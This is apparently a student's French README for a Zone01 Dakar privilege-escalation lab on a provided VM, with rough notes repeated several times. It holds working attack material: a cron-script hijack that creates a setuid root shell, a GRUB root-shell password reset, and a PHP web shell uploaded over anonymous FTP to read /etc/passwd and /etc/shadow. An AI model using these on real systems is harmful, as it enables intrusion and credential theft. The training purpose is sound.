# Privilège Escalation - Projet "Local" de Zone01 Dakar

## Objectif
Ce projet consiste à obtenir un accès root sur la machine virtuelle 01-Local1.ova fournie. La méthodologie inclut des techniques de privilège escalation tout en respectant les restrictions imposées (pas de modification dans GRUB ni dans la VM).

## Pré-requis
- VirtualBox installé pour exécuter la machine virtuelle.
- Kali Linux ou tout autre système d'exploitation avec des outils de pentest pourrait être utile pour attaquer la VM si nécessaire.

## Etapes pas à pas
### I) Importer la VM dans VirtualBox
- Ouvrez VirtualBox.
- Dans File > Import Appliance, sélectionnez le fichier ```01-Local1.ova```.
- Importez la VM et démarrez-la: appuyez sur Next -> Import.

### II) Obtenir un Accès de Base
#### Identifier le point d'entrée:
- La machine n'affiche pas d'adresse IP visible. Vérifiez les interfaces réseau.
- Utilisez des commandes de base telles que ip a ou ifconfig pour identifier toute adresse de loopback ou de type réseau local.
#### Scanner le Réseau Local
Si aucune IP n'est détectée directement, il est possible que la machine soit connectée en réseau NAT ou ponté.
1. Lancez une analyse sur le réseau local depuis votre machine hôte pour détecter d'éventuelles ouvertures.
- ```sudo nmap -sP 192.168.0.0/24```
2. Notez l'adresse IP obtenue. Utilisez ensuite cette adresse pour établir une connexion SSH ou autre
#### Accéder à la VM via SSH (si accessible)
- ```ssh user@<adresse_ip>```
- Remplacez <adresse_ip> par l'adresse IP détectée.
- Utilisez les informations d'identification de base si elles sont fournies.

### III) Analyser les Permissions et Identifier des Failles Potentielles
Une fois dans la machine, cherchez des informations pouvant mener à une escalade de privilège.
#### Vérifier les permissions SUID
Certaines commandes ou exécutables peuvent avoir le bit SUID défini, permettant à n'importe quel utilisateur d'exécuter le fichier avec les privilèges du propriétaire (souvent root).
- ```find / -perm -4000 2>/dev/null```
Notez tous les binaires SUID listés, car certains peuvent être vulnérables.
#### Examiner les tâches cron
Les tâches cron s'exécutent automatiquement, parfois avec des privilèges root.
- ```cat /etc/crontab```
- ```ls -la /etc/cron.*```
Vérifiez si des scripts ou commandes exécutés par cron peuvent être manipulés.

### IV) Escalader les Privilèges
À partir des informations collectées, choisissez une méthode d'escalade de privilège :
#### Exploiter un binaire SUID vulnérable
1. Si un binaire SUID est vulnérable, recherchez les exploits associés dans des bases comme GTFOBins (https://gtfobins.github.io/).
2. Exécutez le binaire avec des privilèges pour vérifier si vous pouvez obtenir un accès root.
#### Manipuler un Script cron
Si un script exécuté par cron est modifiable, insérez une commande pour obtenir un shell root.
1. Par exemple, si myscript.sh s'exécute chaque minute :
- ```echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" >> /path/to/myscript.sh```
2. Attendez que le cron s'exécute, puis lancez /tmp/rootbash -p pour obtenir un accès root.
#### Exécuter une commande de privilège escalation
1. Utilisez des commandes comme sudo si elles sont accessibles.
- ```sudo -l```
2. Si un programme peut être exécuté avec sudo sans mot de passe, exploitez-le pour obtenir un shell root.

### V) Vérification et Capture du Drapeau
1. Une fois root, accédez au fichier flag en utilisant :
- ```cat /root/flag.txt```
2. Notez le contenu du drapeau pour valider l’accès root.

*********************************************************************************************

# Change a password with ubuntu:
1) Redémarrer la machine
2) Appuyer rapidement sur Shift (ou Esc)
3) Dans le menu Grub allez dans "Mode de récupération"
4) puis dans "Drop to root shell prompt"
5) mettez "mount -o remount,rw /"
6) passwd MotDePasse
7) "reboot"


****************************************************************


# mettre ceci dans le navigateur:
- http://ADRESSE_IP_VM/files/webshell.php?cmd=cat%20/etc/passwd
- http://192.168.1.26/files/webshell.php?cmd=ls%20-l%20/etc/shadow
- http://192.168.1.26/files/webshell.php?cmd=cat%20/var/backups/apt.extended_states.1.gz


ùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùù

# Real Readme

# télécharger
```01-Local1.ova```

# mettez ceci 
```sha1sum 01-Local1.ova``` pour vérifier le hash

# et regardez si le résultat est
```f3422f3364fd38e8183740f8f57fa951d3f6e0bf```

# installer virtualbox si ce n'est pas encore fait
```sudo apt update && sudo apt install -y virtualbox```

# assure toi d'avoir les outils nécessaires
```sudo apt update && sudo apt install -y net-tools nmap john hydra metasploit-framework```

# double clic sur ```01-Local1.ova```

# donnez 4096MB comme RAM (pour renforcer la machine virtuelle)
au lieu de de 512

# Changez l'adapter en NAT
au lieu de Bridge

# assure toi que la machine virtuelle
soit activée

# mettez ceci
nmap -sn 192.168.1.0/24

# sélectionnez l'adresse de la VM et mettez ceci
nmap -A ```adresse```

# se connecter
se connecter et examiner les fichiers trouvés

# créer webshell.php et y mettre ceci:
```
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    $cmd = ($_GET['cmd']);
    system($cmd);
    echo "</pre>";
}
?>
```

# mettre ceci
ftp 192.168.1.26
login: anonymous
pwd: Entrée (le bouton)

# téléverser le fichier
```put webshell.php```

# éxécuter ceci dans un terminal
nc -lvnp 4444

# mettre ceci dans le navigateur:
- http://ADRESSE_IP_VM/files/webshell.php?cmd=cat%20/etc/passwd
- http://192.168.1.26/files/webshell.php?cmd=ls%20-l%20/etc/shadow
- http://192.168.1.26/files/webshell.php?cmd=cat%20/var/backups/apt.extended_states.1.gz

$$$$$$$$$$$$$$$$$$$$$


# télécharger
```01-Local1.ova```

# mettez ceci 
```sha1sum 01-Local1.ova``` pour vérifier le hash

# et regardez si le résultat est
```f3422f3364fd38e8183740f8f57fa951d3f6e0bf```

# installer virtualbox si ce n'est pas encore fait
```sudo apt update && sudo apt install -y virtualbox```

# assure toi d'avoir les outils nécessaires
```sudo apt update && sudo apt install -y net-tools nmap john hydra metasploit-framework```

# double clic sur ```01-Local1.ova```

# donnez 4096MB comme RAM (pour renforcer la machine virtuelle)
au lieu de de 512

# Changez l'adapter en NAT
au lieu de Bridge

# assure toi que la machine virtuelle
soit activée

# mettez ceci
nmap -sn 192.168.1.0/24

# sélectionnez l'adresse de la VM et mettez ceci
nmap -A ```adresse```

# se connecter
se connecter et examiner les fichiers trouvés

# créer webshell.php et y mettre ceci:
```
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    $cmd = ($_GET['cmd']);
    system($cmd);
    echo "</pre>";
}
?>
```

# mettre ceci
ftp 192.168.1.26
login: anonymous
pwd: Entrée (le bouton)

# téléverser le fichier
```put webshell.php```

# éxécuter ceci dans un terminal
nc -lvnp 4444

# mettre ceci dans le navigateur:
- http://ADRESSE_IP_VM/files/webshell.php?cmd=cat%20/etc/passwd
- http://192.168.1.26/files/webshell.php?cmd=ls%20-l%20/etc/shadow
- http://192.168.1.26/files/webshell.php?cmd=cat%20/var/backups/apt.extended_states.1.gz

# username
shrek

# password
not yet